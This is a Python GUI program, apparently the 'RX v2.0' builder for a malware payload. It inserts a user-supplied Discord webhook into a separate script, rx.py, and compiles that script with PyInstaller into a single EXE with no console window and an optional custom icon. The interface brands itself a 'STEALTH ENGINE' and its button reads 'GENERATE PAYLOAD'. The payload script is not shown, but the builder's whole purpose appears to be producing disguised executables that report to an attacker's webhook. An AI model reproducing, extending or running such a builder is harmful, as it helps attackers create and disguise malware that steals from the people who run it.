import os
import shutil
import webbrowser
from tkinter import filedialog, messagebox
import customtkinter as ctk

# --- INITIAL SETUP ---
PROJECT_DIR = "Build_Project"
FILE_NAME = 'rx.py'
ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue") 

if not os.path.exists(PROJECT_DIR):
    os.makedirs(PROJECT_DIR)
if os.path.exists(FILE_NAME) and not os.path.exists(os.path.join(PROJECT_DIR, FILE_NAME)):
    shutil.move(FILE_NAME, os.path.join(PROJECT_DIR, FILE_NAME))
os.chdir(PROJECT_DIR)

# --- THEME COLORS ---
BG_COLOR = "#0f0f12"
SIDEBAR_COLOR = "#16161d"
ACCENT_BLUE = "#3b82f6"
TEXT_SUB = "#94a3b8"

# --- FUNCTIONS ---
def validate_webhook(webhook):
    return 'api/webhooks' in webhook

def replace_webhook(webhook):
    if not os.path.exists(FILE_NAME):
        messagebox.showerror("Error", f"{FILE_NAME} not found!")
        return False
    
    with open(FILE_NAME, 'r', encoding='utf-8') as file:
        lines = file.readlines()
    
    with open(FILE_NAME, 'w', encoding='utf-8') as file:
        for line in lines:
            if line.strip().startswith('h00k ='):
                file.write(f'h00k = "{webhook}"\n')
            else:
                file.write(line)
    return True

def build_exe():
    webhook = entry.get()
    if not validate_webhook(webhook):
        messagebox.showerror("Auth Error", "Please provide a valid Discord Webhook.")
        return

    if replace_webhook(webhook):
        icon_option = ""
        if check_var.get() == "on":
            icon_path = filedialog.askopenfilename(filetypes=[("Icon", "*.ico")])
            if icon_path: icon_option = f' --icon="{icon_path}"'
        
        status_label.configure(text="STATUS: BUILDING...", text_color=ACCENT_BLUE)
        app.update()
        
        # Compiles rx.py into a single EXE
        os.system(f'pyinstaller --noconsole --onefile{icon_option} {FILE_NAME}')
        
        status_label.configure(text="STATUS: SUCCESS", text_color="#10b981")
        messagebox.showinfo("Build Success", "Executable generated in /dist folder.")

def open_link(url):
    webbrowser.open(url)

# --- GUI LAYOUT ---
app = ctk.CTk()
app.title("RX v2.0 | Advanced Builder")
app.geometry("650x420")
app.configure(fg_color=BG_COLOR)
app.resizable(False, False)

# Sidebar Navigation
sidebar = ctk.CTkFrame(app, width=200, corner_radius=0, fg_color=SIDEBAR_COLOR, border_width=0)
sidebar.pack(side="left", fill="y")

logo_label = ctk.CTkLabel(sidebar, text="RX-V2", font=("Impact", 32), text_color=ACCENT_BLUE)
logo_label.pack(pady=(30, 5))
sub_logo = ctk.CTkLabel(sidebar, text="STEALTH ENGINE", font=("Arial Bold", 10), text_color=TEXT_SUB)
sub_logo.pack(pady=(0, 40))

# Contact Links in Sidebar
ctk.CTkLabel(sidebar, text="PROJECT LINKS", font=("Arial Bold", 11), text_color=TEXT_SUB).pack(pady=(10, 5))

site_btn = ctk.CTkButton(sidebar, text="Official Site", fg_color="transparent", text_color="white", 
                         hover_color="#1e1e26", anchor="w", command=lambda: open_link('https://rxcheats.netlify.app/'))
site_btn.pack(fill="x", padx=10, pady=2)

disc_btn = ctk.CTkButton(sidebar, text="Discord Server", fg_color="transparent", text_color="white", 
                         hover_color="#1e1e26", anchor="w", command=lambda: open_link('https://discord.gg/r77ndghBv8'))
disc_btn.pack(fill="x", padx=10, pady=2)

# Main Configuration Panel
container = ctk.CTkFrame(app, fg_color="transparent")
container.pack(side="right", fill="both", expand=True, padx=30, pady=20)

title = ctk.CTkLabel(container, text="Payload Configuration", font=("Arial Bold", 22), text_color="white")
title.pack(anchor="w", pady=(10, 5))
desc = ctk.CTkLabel(container, text="Target: rx.py | Compile into secure standalone EXE.", font=("Arial", 12), text_color=TEXT_SUB)
desc.pack(anchor="w", pady=(0, 25))

# Input Field
entry_label = ctk.CTkLabel(container, text="DISCORD WEBHOOK URL", font=("Arial Bold", 11), text_color=ACCENT_BLUE)
entry_label.pack(anchor="w", pady=(10, 5))
entry = ctk.CTkEntry(container, width=380, height=45, placeholder_text="Paste your webhook here...", 
                     fg_color="#1c1c24", border_color="#2d2d3a", corner_radius=8)
entry.pack(anchor="w")

# Customization
check_var = ctk.StringVar(value="off")
checkbox = ctk.CTkCheckBox(container, text="Add Custom Icon (.ico)", variable=check_var, 
                           onvalue="on", offvalue="off", font=("Arial", 12))
checkbox.pack(anchor="w", pady=25)

# Build Control
btn_frame = ctk.CTkFrame(container, fg_color="transparent")
btn_frame.pack(fill="x", side="bottom", pady=20)

button = ctk.CTkButton(btn_frame, text="GENERATE PAYLOAD", width=220, height=50, corner_radius=10,
                       font=("Arial Bold", 14), fg_color=ACCENT_BLUE, hover_color="#2563eb", command=build_exe)
button.pack(side="left")

status_label = ctk.CTkLabel(btn_frame, text="STATUS: READY", font=("Arial Bold", 10), text_color=TEXT_SUB)
status_label.pack(side="right", padx=10)

app.mainloop()
